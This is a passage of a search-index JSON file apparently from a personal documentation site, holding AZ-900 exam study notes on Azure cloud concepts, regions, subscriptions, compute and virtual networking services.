<li>Flashcards</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#basic-cloud-computing-concepts","title":"Basic Cloud Computing concepts","text":"","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#shared-responsability-model","title":"Shared responsability model","text":"<p>Very often, IaaS, PaaS and SaaS are referred as Cloud computing stack because esencially they are built on top one from another. </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#cloud-models","title":"Cloud models","text":"","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#public-cloud","title":"Public cloud","text":"<p>In a public cloud deployment, services are offered over the public internet. These services are available to customers who wish to purchase them. The cloud resources, like servers and storage, are owned and operated by the cloud service provider. </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#private-cloud","title":"Private cloud","text":"<p>In a private cloud, compute resources are accessed exclusively by users from a single business or organization. You can host a private cloud physically in your own on-prem datacenter, or it can be hosted by a third-party cloud service provider. </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#hybrid-cloud","title":"Hybrid cloud","text":"<p>A hybrid cloud is a complex computing environment. It combines a public cloud and a private cloud by allowing data and applications to be shared between them. This type of cloud deployment is often utilized by large organizations.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#consumption-based-model","title":"Consumption-Based Model","text":"<p>The consumption-based model refers to the way in which organizations only pay for the resources they use. The consumption-based model offers the following benefits: </p> <ul> <li>No upfront costs </li> <li>No need to purchase or manage infrastructure </li> <li>Customer pays for resources only when they are needed </li> <li>Customer can stop paying for resources that are no longer needed</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#benefits-of-cloud-computing","title":"Benefits of Cloud Computing","text":"<p>Cloud computing offers several key advantages over a physical environment: </p> <ul> <li>High availability: Cloud-based apps can provide a continuous user experience with virtually no downtime. </li> <li>Scalability: Apps in the cloud can scale vertically and horizontally. When scaling vertically, compute capacity is added by adding RAM or CPUs to a virtual machine. When scaling horizontally, compute capacity is increased by adding instances of resources, such as adding VMs to a configuration. </li> <li>Elasticity: Allows you to configure apps to autoscale so they always have the resources they need. </li> <li>Agility: Deploy and configure cloud-based resources quickly as requirements change. </li> <li>Geo-distribution: Deploy apps to regional datacenters so that customers always have the best performance in their specific region. </li> <li>Disaster recovery: Cloud-based backup services, data replication, and geo-distribution allow you to deploy apps and know that their data is safe in the event of disaster. </li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#capital-expenses-vs-operating-expenses","title":"Capital Expenses vs. Operating Expenses","text":"<p>Organizations have to think about two different types of expenses: </p> <ul> <li>Capital Expenditure (CapEx): The spending of money up-front on physical infrastructure. These expenses are deducted over time. </li> <li>Operational Expenditure (OpEx): The spending of money on services or products now and being billed for them now. These expenses are deducted in the same year they are incurred. Most cloud services are considered OpEx.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#the-cloud-computing-stack","title":"The Cloud Computing stack","text":"<p>Before delving deeper, I would like to share this highly informative chart depicting Azure services and their position within the cloud computing stack.</p> <p></p> <p>After this, let's start with the stack!</p> <p></p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#infrastructure-as-a-service-iaas","title":"Infrastructure-as-a-Service (IaaS)","text":"<p>Migrating to IaaS helps reduce the need for maintenance of on-prem data centers and allows organizations to save money on hardware costs. IaaS solutions allow organizations to scale their IT resources up and down with demand, while also allowing them to quickly provision new applications and increase the reliability of their underlying infrastructure.</p> <p>1. One common business scenario and use case for IaaS is Lift-and-Shift Migration:</p> <pre><code>- migrate app and workloads to the cloud\n- Increase scale and perfomance\n- Enhance security\n- Reduce the cost without refactoring the application\n</code></pre> <p>2. Another common use case is Storage, backup, and recovery:</p> <pre><code>- Avoid capital outlay for storage and complexity of storage management\n- IaaS is useful for handling unpredictable demand and steadily growing storage needs\n- Simplify planning/management of backup/recovery\n</code></pre> <p>3. Web apps IaaS provides all the infrastructure needed to support web apps: storage, web and application servers, networking resources. Quickly deployable, easily scale infrastructure up and down.</p> <p>4. High-performance computer</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#platform-as-a-service-paas","title":"Platform-as-a-Service (PaaS)","text":"<p>Basically, PaaS is a complete development and deployment environment in the cloud. Includes: servers, storage, networking, middleware, development tools, BI services, database management systems, and more. PaaS supports the complete web application lifecycle.  Yo manage the applications and services and the service provider manages everything else.</p> <p>Platform-as-a-Service is a complete development and deployment environment in the cloud. It can be used to deploy simple cloud-based apps and complex cloud-enabled enterprise applications. When leveraging PaaS, you purchase the resources you need from your cloud service provider on a pay-as-yougo basis. The resource you purchase are accessed over a secure Internet connection.</p> <p>PaaS resources include the same resources included in IaaS (servers, storage, and networking) PLUS things like middleware, development tools, business intelligence services, and database management systems.</p> <p>It\u2019s important to remember that PaaS is designed to support the complete web application lifecycle. It allows organizations to avoid the expense buying and managing software licenses, underlying infrastructure and middleware, container orchestrators, and development tools. </p> <p>Ultimately, when leveraging PaaS offerings, you manage the applications and services, while the cloud service provider manages everything else.</p> <p>1.  One common business scenario and use case for PaaS is Development framework. A framework that developers can use to develop or customize cloud based applications and that Azure provides.</p> <p>2. Analytics and BI: tools provided as a service with PaaS.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#software-as-a-service-saas","title":"Software-as-a-Service (SaaS)","text":"<p>Software-as-a-Service allows users to connect to cloud-based apps over the Internet. Microsoft Office 365 is a good example of SaaS in action. Gmail would be another good example. SaaS provides a complete software solution that\u2019s purchased on a pay-as-you-go basis from a cloud service provider. It\u2019s essentially the rental of an app, that users can then connect to over the Internet, via a web browser. The underlying infrastructure, middleware, app software, and app data for a SaaS solution are all hosted in the provider\u2019s data center, which means the service provider is responsible for managing the hardware and software. SaaS allows organizations to get up and running quickly, with minimal upfront cost.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#architectural-components","title":"Architectural components","text":"<p>The core architectural components of Azure may be broken down into two main groupings: the physical infrastructure, and the management infrastructure.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#physical-infrastructure","title":"Physical infrastructure","text":"<p>The physical infrastructure for Azure starts with datacenters. Conceptually, the datacenters are the same as large corporate datacenters. They\u2019re facilities with resources arranged in racks, with dedicated power, cooling, and networking infrastructure. \u00a0Individual datacenters aren\u2019t directly accessible. Datacenters are grouped into Azure Regions or Azure Availability Zones</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-region","title":"Azure Region","text":"<p>A region is a geographical area that contains at least one (but potentially multiple) datacenters that are networked together with a low-latency network.</p> <p>Every Azure region is paired with another region within the same geography (ie. US, Europe, or Asia) at least 300 miles away in order to allow replication of resources across that geography. Replicating resources across region pairs helps reduce interruptions due to events like natural disasters, civil unrest, power outages, or physical network outages that affect both regions at once.</p> <p>Some services or features are only available in certain regions. Others don't require to select an specific region. For instance: Azure Active Directory, Azure Traffic Manager, or Azure DNS.</p> <p></p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#availability-zones","title":"Availability zones","text":"<p>Availability zones are physically separate datacenters within an Azure region. Each availability zone is made up of one or more datacenters equipped with independent power, cooling, and networking.</p> <p>Availability zones are physically separate datacenters within an Azure region. Every availability zone includes one or more datacenters that features independent power, cooling, and networking. In essence, an availability zone is designed to be an isolation boundary, meaning if one zone goes down, the other continues working.  </p> <p>Availability zones are designed primarily for VMs, managed disks, load balancers, and SQL databases.   It is important to remember that availability zones are connected through private high-speed fiber-optic networks. The image below shows what availability zones look like within a region: </p> <p></p> <p>To ensure resiliency, a minimum of three separate availability zones are present in all availability zone-enabled regions. However, not all Azure Regions currently support availability zones.</p> <p>Azure services that support availability zones fall into three categories:</p> <ul> <li>Zonal services: You pin the resource to a specific zone (for example, VMs, managed disks, IP addresses).</li> <li>Zone-redundant services: The platform replicates automatically across zones (for example, zone-redundant storage, SQL Database).</li> <li>Non-regional services: Services are always available from Azure geographies and are resilient to zone-wide outages as well as region-wide outages.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#region-pairs","title":"Region pairs","text":"<p>Each Azure region is paired with another region within the same geography at least 300 miles away. This is done to allow for the replication of resources across a geography and reduce the chance of unavailability. West US region is, for instance, paired with East US.</p> <p>If an outage occurs:  one region is prioritized to make sure that at least one is restored as quickly as possible. It also does so to minimize downtime.  Data continues to reside within the same geography as its pair (except for Brazil South) for tax -and law- enforcement jurisdiction purposes.</p> <p>Most regions are paired in two directions, meaning they are the backup for the region that provides a backup for them (West US and East US back each other up). However, some regions, such as West India and Brazil South, are paired in only one direction. In a one-direction pairing, the Primary region does not provide backup for its secondary region. So, even though West India\u2019s secondary region is South India, South India does not rely on West India. West India's secondary region is South India, but South India's secondary region is Central India. Brazil South is unique because it's paired with a region outside of its geography. Brazil South's secondary region is South Central US. The secondary region of South Central US isn't Brazil South.</p> <p>Sovereign regions</p> <p>In addition to regular regions, Azure also has sovereign regions. Sovereign regions are instances of Azure that are isolated from the main instance of Azure. You may need to use a sovereign region for compliance or legal purposes. Azure sovereign regions include:   - US DoD Central, US Gov Virginia, US Gov Iowa and more: These regions are physical and logical network-isolated instances of Azure for U.S. government agencies and partners. These datacenters are operated by screened U.S. personnel and include additional compliance certifications.   - China East, China North, and more: These regions are available through a unique partnership between Microsoft and 21Vianet, whereby Microsoft doesn't directly maintain the datacenters.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#management-infrastructure","title":"Management infrastructure","text":"","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-resources-and-resource-groups","title":"Azure Resources and Resource Groups","text":"<p>A resource is the basic building block of Azure. Anything you create, provision, deploy, etc. is a resource. Virtual Machines (VMs), virtual networks, databases, cognitive services, etc. are all considered resources within Azure.</p> <p>Resource groups are simply groupings of resources. When you create a resource, you\u2019re required to place it into a resource group. While a resource group can contain many resources, a single resource can only be in one resource group at a time. Some resources may be moved between resource groups, but when you move a resource to a new group, it will no longer be associated with the former group. Additionally, resource groups can't be nested, meaning you can\u2019t put resource group B inside of resource group A.</p> <p>If you grant or deny access to a resource group, you\u2019ve granted or denied access to all the resources within the resource group. When deleting a resource group, all resources included in it  will be deleted, so it makes sense to organized your resource groups by similar lifecycle, or by function.</p> <p>A resource group can be used to scope access control for administrative actions. To manage a resource group, you can assign\u00a0Azure Policies,\u00a0Azure roles, or\u00a0resource locks.</p> <p>You can\u00a0apply tags\u00a0to a resource group. The resources in the resource group don't inherit those tags.</p> <p>You can deploy up to 800 instances of a resource type in each resource group. Some resource types are\u00a0exempt from the 800 instance limit. For more information, see\u00a0resource group limits.</p> <p>When you create a resource group, you need to provide a location for that resource group. You may be wondering, \"Why does a resource group need a location? And, if the resources can have different locations than the resource group, why does the resource group location matter at all?\". The resource group stores metadata about the resources. When you specify a location for the resource group, you're specifying where that metadata is stored. For compliance reasons, you may need to ensure that your data is stored in a particular region. If a resource group's region is temporarily unavailable, you can't update resources in the resource group because the metadata is unavailable.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-subscription","title":"Azure Subscription","text":"<p>An Azure subscription provides authenticated and authorized access to Azure products and services and allows organizations to provision cloud resources. Every Azure subscription links to an Azure account. </p> <p>In Azure, subscriptions are a unit of management, billing, and scale.</p> <p>An account can have multiple subscriptions, but it\u2019s only required to have one. In a multi-subscription account, you can use the subscriptions to configure different billing models and apply different access-management policies. </p> <p>You can use Azure subscriptions to define boundaries around Azure products, services, and resources. There are two types of subscription boundaries that you can use:</p> <ul> <li>Billing boundary: This subscription type determines how an Azure account is billed for using Azure. You can create multiple subscriptions for different types of billing requirements. Azure generates separate billing reports and invoices for each subscription so that you can organize and manage costs.</li> <li>Access control boundary: Azure applies access-management policies at the subscription level, and you can create separate subscriptions to reflect different organizational structures. An example is that within a business, you have different departments to which you apply distinct Azure subscription policies. This billing model allows you to manage and control access to the resources that users provision with specific subscriptions. </li> </ul> <p>Use cases for creating additional subscriptions:</p> <ul> <li>To separate Environments: separate environments for development and testing, security, or to isolate data for compliance reasons. This design is particularly useful because resource access control occurs at the subscription level.</li> <li>To separate Organizational structures:  you could limit one team to lower-cost resources, while allowing the IT department a full range. This design allows you to manage and control access to the resources that users provision within each subscription.</li> <li>To separate Billing: For instance, you might want to create one subscription for your production workloads and another subscription for your development and testing workloads.</li> </ul> <p>After you've created an Azure account, you're free to create additional subscriptions. After you've created an Azure suscription, you can start creating Azure resources within each subscription.</p> <p></p> <p>You can have up to 2000 role assignments in each subscription.</p> <p>Each Azure Subscription can not trust multiple Active Directories. An Azure subscription has a trust relationship with Azure Active Directory (Azure AD). A subscription trusts Azure AD to authenticate users, services, and devices. Multiple subscriptions can trust the same Azure AD directory. Each subscription can only trust a single directory.</p> <p></p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#management-groups-in-azure","title":"Management Groups in Azure","text":"<p>To efficiently manage access, policies (like available regions), and compliance when you manage multiple Azure subscriptions, you can use Management Groups, because management groups provide scope that sits above subscriptions.  </p> <p>When managing multiple subscriptions, you organize those subscriptions into containers called management groups, to  which you can then apply governance conditions. All subscriptions within a management group will, in turn, inherit the conditions you apply to the management group.  </p> <p>All subscriptions within a single management group must trust the same Azure AD tenant.</p> <p>The image below highlights how you can create a hierarchy for governance through the use of management groups: </p> <p></p> <p>Some examples of how you could use management groups might be:</p> <ul> <li>Create a hierarchy that applies a policy. </li> <li>Provide user access to multiple subscriptions. </li> </ul> <p>Facts we need to know:</p> <ul> <li>Maximum of 10,000 management groups supported in a single directory.</li> <li>A management group tree can support up to six levels of depth (root and subscription level not included)</li> <li>Each management group and subscription can support only one parent.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#tags","title":"Tags","text":"<p>One way to organize related resources is to place them in their own subscriptions. You can also use resource groups to manage related resources. Resource tags are another way to organize resources. Tags provide extra information, or metadata, about your resources. A resource tag consists of a name and a value. You can assign one or more tags to each Azure resource. Keep in mind that you don't need to enforce that a specific tag is present on all of your resources. </p> Name Value AppName The name of the application that the resource is part of. CostCenter The internal cost center code. Owner The name of the business owner who's responsible for the resource. Environment An environment name, such as \"Prod,\" \"Dev,\" or \"Test.\" Impact How important the resource is to business operations, such as \"Mission-critical,\" \"High-impact,\" or \"Low-impact.\" <p>How do I manage resource tags?</p> <p>You can add, modify, or delete resource tags through Windows PowerShell, the Azure CLI, Azure Resource Manager templates, the REST API, or the Azure portal. </p> <p>You can also use Azure Policy to enforce tagging rules and conventions. </p> <p>Resources don't inherit tags from subscriptions and resource groups, meaning that you can apply tags at one level and not have those tags automatically show up at a different level, allowing you to create custom tagging schemas that change depending on the level (resource, resource group, subscription, and so on).</p> <p>Limitations to tags:</p> <ul> <li>Not all resource types support tags.</li> <li>Maximum of 50 tags (for Resource Groups and Resources).<ul> <li>Tag name length: 512 characters.</li> <li>Tag value length: 256 characters.</li> </ul> </li> <li>Maximum of 15 tags for storage accounts.<ul> <li>Tag name length: 128 characters.</li> <li>Tag value length: 256 characters. VM and VM scale sets: total set of 2048 character</li> </ul> </li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-compute-services-and-products","title":"Azure Compute services and products","text":"<p>Azure compute is an on-demand computing service that organizations use to run cloud-based applications. It provides compute resources like disks, processors, memory, networking, and even operating systems. Azure supports many types of compute solutions, including Linux, Windows Server, SQL Server, Oracle, IBM, and SAP. Each Azure compute service offers different options depending on your requirements. The most common Azure compute services are:</p> <ol> <li> <p>Azure Virtual Machines </p> <ul> <li>VM Scale Sets </li> <li>VM Availability Sets</li> </ul> </li> <li> <p>Azure Virtual Desktop </p> </li> <li> <p>Azure Container Instances </p> </li> <li> <p>Azure Functions (serverless computing)</p> </li> <li> <p>Azure Logic Apps  (serverless computing)</p> </li> <li> <p>Azure App Service </p> </li> <li> <p>Azure Virtual Networking</p> </li> <li> <p>Azure Virtual Private Networks</p> </li> <li> <p>Azure ExpressRoute</p> </li> <li> <p>Azure DNS</p> </li> </ol>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#1-azure-virtual-machines","title":"1. Azure Virtual Machines","text":"<p>Virtual machines are virtual versions of physical computers that feature virtual processors, memory, storage, and networking resources. They host an operating system just like a physical computer, and you can install and run software on them just like a physical computer. </p> <p>VM provides IaaS and can be used in two ways:</p> <ul> <li>When you need total control over an operating system /environment, VMs are ideal when using in-house or customized software.</li> </ul> <p>SLA for Virtual Machines</p> <ul> <li> <p>For all Virtual Machines that have two or more instances deployed across two or more Availability Zones in the same Azure region, we guarantee you will have Virtual Machine Connectivity to at least one instance at least 99.99% of the time.</p> </li> <li> <p>For all Virtual Machines that have two or more instances deployed in the same Availability Set or in the same Dedicated Host Group, we guarantee you will have Virtual Machine Connectivity to at least one instance at least 99.95% of the time.</p> </li> <li> <p>For any Single Instance Virtual Machine using Premium SSD or Ultra Disk for all Operating System Disks and Data Disks, we guarantee you will have Virtual Machine Connectivity of at least 99.9%.</p> </li> <li> <p>For any Single Instance Virtual Machine using Standard SSD Managed Disks for Operating System Disk and Data Disks, we guarantee you will have Virtual Machine Connectivity of at least 99.5%.</p> </li> <li> <p>For any Single Instance Virtual Machine using Standard HDD Managed Disks for Operating System Disks and Data Disks, we guarantee you will have Virtual Machine Connectivity of at least 95%.</p> </li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#virtual-machine-scale-sets","title":"Virtual Machine Scale Sets","text":"<p>Azure can also manage the grouping of VMs for you with features such as scale sets and availability sets. A virtual machine scale set allows you to deploy and manage a set of identical VMs that you can use to deploy solutions with true autoscale. As demand increases, VM instances can be added.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#virtual-machine-availability-sets","title":"Virtual machine availability sets","text":"<p>Virtual machine availability sets are another tool to \u00a0ensure that VMs stagger updates and have varied power and network connectivity, preventing you from losing all your VMs with a single network or power failure.</p> <p>Availability sets do this by grouping VMs in two ways: update domain and fault domain.</p> <ul> <li>Update domain: The update domain groups VMs that can be rebooted at the same time. </li> <li>Fault domain: The fault domain groups your VMs by common power source and network switch. By default, an availability set will split your VMs across up to three fault domains. This helps protect against a physical power or networking failure by having VMs in different fault domains.</li> </ul> <p>There\u2019s no additional cost for configuring an availability set. You only pay for the VM instances you create.</p> <p>When to use VMs: During testing and development, When running applications in the cloud, When extending your datacenter to the cloud, During disaster recovery.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#2-azure-virtual-desktop","title":"2. Azure Virtual Desktop","text":"<p>Azure Virtual Desktop is a desktop and application virtualization service that runs on the cloud. It enables you to use a cloud-hosted version of Windows from any location. Azure Virtual Desktop provides centralized security management for users' desktops with Azure Active Directory (Azure AD). You can enable multifactor authentication to secure user sign-ins. You can also secure access to data by assigning granular role-based access controls (RBACs) to users.  With Azure Virtual Desktop, the data and apps are separated from the local hardware. The actual desktop and apps are running in the cloud, meaning the risk of confidential data being left on a personal device is reduced. Azure Virtual Desktop lets you use Windows 10 or Windows 11 Enterprise multi-session, the only Windows client-based operating system that enables multiple concurrent users on a single VM.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#3-azure-container-instances","title":"3. Azure Container Instances","text":"<p>Much like running multiple virtual machines on a single physical host, you can run multiple containers on a single physical or virtual host.  Virtual machines appear to be an instance of an operating system that you can connect to and manage.</p> <p>VM vs Containers</p> <p>VM virtualizes the hardware emulating a computer. Containers virtualizes the Operating System. Unlike virtual machines, you don't manage the operating system for a container. Containers are a virtualization environment. If you need complete control, you use VM. On the other hands, Container priorizes portability and performance.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-container-instances-aci","title":"Azure Container Instances (ACI)","text":"<p>Azure Container Instances offer the fastest and simplest way to run a container in Azure; without having to manage any virtual machines or adopt any additional services. Azure Container Instances are a platform as a service (PaaS) offering. Azure Container Instances allow you to upload your containers and then the service will run the containers for you.</p> <p>Azure Container Instances ACI versus Azure Kubernetes service  AKS</p> <p>For many organizations, containers have become the preferred way to package, deploy, and manage cloud apps. </p> <ul> <li>Azure Container Instances (ACI) is the easiest way to run a container in Azure, without the need for any VMs or other infrastructure.  You can use docker images.</li> <li>However, if you require full container orchestration, Microsoft  recommends Azure Kubernetes Service (AKS). </li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-container-apps","title":"Azure Container Apps","text":"<p>Azure Container Apps are similar in many ways to a container instance. They allow you to get up and running right away, they remove the container management piece, and they're a PaaS offering. Container Apps have extra benefits such as the ability to incorporate load balancing and scaling. These other functions allow you to be more elastic in your design.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-kubernetes-service-aks","title":"Azure Kubernetes Service (AKS)","text":"<p>Azure Kubernetes Service (AKS) is a container orchestration service. An orchestration service manages the lifecycle of containers. When you're deploying a fleet of containers, AKS can make fleet management simpler and more efficient.</p> <p>AKS simplifies the deployment of a managed Kubernetes cluster in Azure by offloading the operational overhead to Azure. Since it\u2019s hosted, Azure handles the health monitoring and maintenance. The Kubernetes masters are managed by Azure, and you manage and maintain the agent nodes.  </p> <p>It\u2019s important to note that AKS itself is free. You pay only for the agent nodes within your clusters, not for the masters. </p> <p>You can deploy an AKS cluster using  Azure CLI, Azure Portal, Azure Powershell, and Template-driven deployment options  (ARM templates, bicep, terraform).</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#4-azure-functions-serverless-computing","title":"4. Azure Functions (serverless computing)","text":"<p>Functions are a serverless technology that are best used in cases where you're concerned only about the code running your service and not the underlying platform or infrastructure.</p> <p>Azure Functions is an event-driven, serverless compute option that doesn\u2019t require maintaining virtual machines or containers. If you build an app using VMs or containers, those resources have to be \u201crunning\u201d in order for your app to function. With Azure Functions, an event wakes the function, alleviating the need to keep resources provisioned when there are no events.</p> <p>Benefits: - No infraestructure management: as a business you don't have to focus on administrative tasks. - Scalability. - You only pay for what you use. Price based on consumption: number of executions + runnign time for each.</p> <p>Functions are commonly used when you need to perform work in response to an event (often via a REST request), timer, or message from another Azure service. Azure Functions runs your code when it's triggered and automatically deallocates resources when the function is finished. In this model, you're only charged for the CPU time used while your function runs. Functions can be either stateless or stateful. When they're stateless (the default), they behave as if they're restarted every time they respond to an event. When they're stateful (called Durable Functions), a context is passed through the function to track prior activity.</p> <p>Generally, Azure Functions is stateless. BUT you can use an extension called Durable Functions to chain together functions and maintain their state while the functions are executing.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#5-azure-logic-apps-serverless-computing","title":"5. Azure Logic Apps  (serverless computing)","text":"<p>When you need something more complex than Functions, like a workflow or a process, Azure Logic Apps is a good solution. It enables you to create no-code and low-code solutions hosted in Azure to automate and orchestrate tasks, business processes, and workflows. </p> <p>Implementation can be done using a web-based design environment. You build the app by connecting triggers to actions with various connections. </p> <p>Price based on consumption: number of executions + type of connections that the app uses.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#6-azure-app-service","title":"6. Azure App Service","text":"<p>App Service is a compute platform that you can use to quickly build, deploy, and scale enterprise grade web apps, background jobs, mobile back-ends, and RESTful APIs in the programming language of your choice (it supports multiple languages, including .NET, .NET Core, Java, Ruby, Node.js, PHP, or Python) without managing infrastructure (it also supports both Windows and Linux environments).</p> <p>App service is a PaaS offering. It offers automatic scaling and high availability. It enables automated deployments from GitHub, Azure DevOps, or any Git repo to support a continuous deployment model.</p> <p>App Service handles most of the infrastructure decisions you deal with in hosting web-accessible apps:</p> <ul> <li>Deployment and management are integrated into the platform.</li> <li>Endpoints can be secured.</li> <li>Sites can be scaled quickly to handle high traffic loads.</li> <li>The built-in load balancing and traffic manager provide high availability.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#web-apps","title":"Web apps","text":"<p>App Service includes full support for hosting web apps by using ASP.NET, ASP.NET Core, Java, Ruby, Node.js, PHP, or Python. You can choose either Windows or Linux as the host operating system.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#api-apps-azure-rest-api","title":"API apps (Azure Rest API)","text":"<p>Much like hosting a website, you can build REST-based web APIs by using your choice of language and framework. You get full Swagger support and the ability to package and publish your API in Azure Marketplace. The produced apps can be consumed from any HTTP- or HTTPS-based client.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#webjobs","title":"WebJobs","text":"<p>You can use the WebJobs feature to run a program (.exe, Java, PHP, Python, or Node.js) or script (.cmd, .bat, PowerShell, or Bash) in the same context as a web app, API app, or mobile app. They can be scheduled or run by a trigger. WebJobs are often used to run background tasks as part of your application logic.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#mobile-apps","title":"Mobile apps","text":"<p>Use the Mobile Apps feature of App Service to quickly build a back end for iOS and Android apps. With just a few actions in the Azure portal, you can store mobile app data in a cloud-based SQL database; authenticate customers against common social providers, such as MSA, Google, Twitter, and Facebook; send push notifications; execute custom back-end logic in C# or Node.js.</p> <p>On the mobile app side, there's SDK support for native iOS and Android, Xamarin, and React native apps.</p> <ul> <li>Access, manage, monitor Azure accounts and resources.</li> <li>Monitor the health and status of Azure resources, check for alerts, diagnose and fix issues.</li> <li>Stop, start, restart a web app or virtual machine.  </li> <li>Run the Azure CLI or Azure PowerShell commands to manage Azure resources. </li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-advisor","title":"Azure Advisor","text":"<p>Free service for tracking Azure consumption and getting offers recommendations not only for cost savings but also for performance, reliability, and security, </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#arm-templates","title":"ARM templates","text":"<p>ARM templates allow you to declaratively describe the resources you want to use, using JSON format. The template will then create those resources in parallel. For example, need 25 VMs, all 25 VMs will be created at the same time. </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#7-azure-virtual-networking","title":"7. Azure Virtual Networking","text":"<p>Azure virtual networks and virtual subnets enable Azure resources, such as VMs, web apps, and databases, to communicate with each other, with users on the internet, and with your on-premises client computers. </p> <p>Azure virtual networking supports both public and private endpoints to enable communication between external or internal resources with other internal resources.</p> <ul> <li>Public endpoints have a public IP address and can be accessed from anywhere in the world.</li> <li>Private endpoints exist within a virtual network and have a private IP address from within the address space of that virtual network.</li> </ul> <p>It provides the following key networking capabilities: </p> <p>Isolation and segmentation: Azure virtual network allows you to create multiple isolated virtual networks. For name resolution, you can use the name resolution service that's built into Azure. You also can configure the virtual network to use either an internal or an external DNS server.</p> <p>Internet communications: You can enable incoming connections from the internet by assigning a public IP address to an Azure resource, or putting the resource behind a public load balancer.</p> <p>Communicate between Azure resources: Enable Azure resources to communicate securely with each other. Virtual networks can connect not only VMs but other Azure resources. Service endpoints can connect to other Azure resource types.</p> <p>Communicate with on-premises resources: Azure virtual networks enable you to link resources together in your on-premises environment and within your Azure subscription.     - Point-to-site virtual private network connections are from a computer outside your organization back into your corporate network. In this case, the client computer initiates an encrypted VPN connection to connect to the Azure virtual network.     - Site-to-site virtual private networks link your on-premises VPN device or gateway to the Azure VPN gateway in a virtual network. In effect, the devices in Azure can appear as being on the local network. The connection is encrypted and works over the internet.     - Azure ExpressRoute provides a dedicated private connectivity to Azure that doesn't travel over the internet. ExpressRoute is useful for environments where you need greater bandwidth and even higher levels of security.</p> <p>Route network traffic: By default, Azure routes traffic between subnets on any connected virtual networks, on-premises networks, and the internet. Route tables allow you to define rules about how traffic should be directed. Border Gateway Protocol (BGP) works with Azure VPN gateways, Azure Route Server, or Azure ExpressRoute to propagate on-premises BGP routes to Azure virtual networks.</p> <p>Filter network traffic: filter traffic between subnets. - Network security groups are Azure resources that can contain multiple inbound and outbound security rules. You can define these rules to allow or block traffic, based on factors such as source and destination IP address, port, and protocol. - Network virtual appliances are specialized VMs that can be compared to a hardened network appliance. A network virtual appliance carries out a particular network function, such as running a firewall or performing wide area network (WAN) optimization.</p> <p>Connect virtual networks:  You can link virtual networks together by using virtual network peering. Peering allows two virtual networks to connect directly to each other. Network traffic between peered networks is private, and travels on the Microsoft backbone network, never entering the public internet. Peering enables resources in each virtual network to communicate with each other. These virtual networks can be in separate regions, which allows you to create a global interconnected network through Azure.</p> <p>User-defined routes (UDR) allow you to control the routing tables between subnets within a virtual network or between virtual networks. This allows for greater control over network traffic flow.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#8-azure-virtual-private-networks","title":"8. Azure Virtual Private Networks","text":"<p>A virtual private network (VPN) uses an encrypted tunnel within another network. VPNs are typically deployed to connect two or more trusted private networks to one another over an untrusted network (typically the public internet). Traffic is encrypted while traveling over the untrusted network to prevent eavesdropping or other attacks. VPNs can enable networks to safely and securely share sensitive information.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-vpn-gateway-instances","title":"Azure VPN Gateway 